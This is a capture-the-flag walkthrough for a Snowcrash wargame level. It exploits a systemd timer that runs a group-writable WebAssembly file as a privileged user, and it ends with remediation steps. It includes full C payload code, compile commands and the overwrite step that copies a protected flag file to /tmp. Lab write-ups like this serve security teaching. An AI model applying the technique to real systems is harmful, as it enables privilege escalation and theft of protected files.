# Snowcrash — Level 05

**Objective:** escalate from `level05` to `flag05` and read the flag.

---

## Reconnaissance

```bash
id
# groups: level05, metaverse, levelgroup

systemctl list-timers --all
# metaverse.timer fires every 30s

cat /etc/systemd/system/metaverse.timer
cat /etc/systemd/system/metaverse.service
```

`metaverse.service`:

```ini
[Service]
Type=oneshot
User=flag05
ExecStart=/usr/local/bin/wasmtime --dir=/ /opt/snowcrash/level05/metaverse.wasm
```

Check the target:

```bash
ls -la /opt/snowcrash/level05/
# -rw-rw-r-- 1 root metaverse ... metaverse.wasm
# drwxrwxr-x 2 root metaverse ... .
```

---

## Vulnerability

The timer runs `metaverse.wasm` as **`flag05`**, and that file is **group-writable by `metaverse`**. `level05` is in `metaverse`.

→ Any member of `metaverse` can replace the wasm, and the next timer tick runs it as `flag05`.

The shipped wasm is also broken (off-by-one in the path lengths), so it never successfully reads the flag even when the timer fires — but that doesn't matter, we're replacing it.

---

## Exploitation

### 1. Install wasi-sdk (one-time)

Ubuntu's gcc doesn't target `wasm32-wasi`; use the official clang toolchain.

```bash
cd /tmp
wget https://github.com/WebAssembly/wasi-sdk/releases/download/wasi-sdk-24/wasi-sdk-24.0-x86_64-linux.tar.gz
tar xzf wasi-sdk-24.0-x86_64-linux.tar.gz
mv wasi-sdk-24.0-x86_64-linux ~/wasi-sdk
export WASI_SDK=~/wasi-sdk
```

### 2. Write the flag-copy payload

`~/flag05.c`:

```c
#include <fcntl.h>
#include <unistd.h>

int main(void)
{
    int in  = open("home/flag05/.flag", O_RDONLY);
    int out = open("tmp/flag05_result", O_WRONLY | O_CREAT | O_TRUNC, 0644);

    char buffer[4096];
    ssize_t n;

    while ((n = read(in, buffer, sizeof(buffer))) > 0)
        write(out, buffer, n);

    close(in);
    close(out);
    return 0;
}
```

Paths are **relative** to the preopened root (`--dir=/` → fd 3).

### 3. Compile to WASI

```bash
$WASI_SDK/bin/clang --sysroot=$WASI_SDK/share/wasi-sysroot \
    -O2 -o /tmp/flag05.wasm ~/flag05.c
```

### 4. Test locally (optional but useful)

```bash
wasmtime --dir=/ /tmp/flag05.wasm; echo "exit=$?"
ls -la /tmp/flag05_result
```

As `level05` you can't read `/home/flag05`, so `in = -1`, the loop exits, and the output is empty — expected. The compile itself is the thing being tested.

### 5. Install over the timer's target

```bash
mv /tmp/flag05.wasm /opt/snowcrash/level05/metaverse.wasm
ls -la /opt/snowcrash/level05/metaverse.wasm
```

`mv` in the same directory is an atomic `rename(2)` — the timer never sees a partial file.

### 6. Wait for the next tick

```bash
sleep 35
```

Check that the service actually ran:

```bash
systemctl show metaverse.service -p ExecMainExitTimestamp -p ExecMainStatus
# ExecMainStatus=0 means the wasm exited cleanly
```

### 7. Read the loot

```bash
ls -la /tmp/flag05_result
cat /tmp/flag05_result
```

The file is owned by `flag05`; `level05` can read it because it's `0644`.

---

## Flag

The contents of `/tmp/flag05_result`.

---

## Troubleshooting

If `/tmp/flag05_result` is empty (0 bytes), the input open or read failed silently. Add error output to the payload:

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

int main(void)
{
    int in = open("home/flag05/.flag", O_RDONLY);
    if (in < 0) {
        int e = errno;
        int out = open("tmp/flag05_result", O_WRONLY | O_CREAT | O_TRUNC, 0644);
        dprintf(out, "open input: %s\n", strerror(e));
        close(out);
        return 1;
    }

    int out = open("tmp/flag05_result", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    char buffer[4096];
    ssize_t n;
    while ((n = read(in, buffer, sizeof(buffer))) > 0)
        write(out, buffer, n);
    close(in);
    close(out);
    return 0;
}
```

- `No such file or directory` → wrong path; enumerate the directory with a `readdir` variant, or check `find / -user flag05` from a shell you have.
- File exists but is empty → the flag file itself is empty; the exploit mechanism is still correct.
- No `/tmp/flag05_result` at all → the timer didn't run your wasm; verify the file landed at `/opt/snowcrash/level05/metaverse.wasm` and check `systemctl show metaverse.service -p ExecMainExitTimestamp`.

---

## Remediation

- `chown root:root /opt/snowcrash/level05/metaverse.wasm && chmod 755` — remove group write
- Execute the wasm from a root-owned, non-group-writable directory
- Harden the unit:
  ```ini
  ProtectSystem=strict
  ReadOnlyPaths=/opt/snowcrash
  NoNewPrivileges=yes
  PrivateTmp=yes
  ```
- Preopen only the specific directories the wasm needs, not `--dir=/`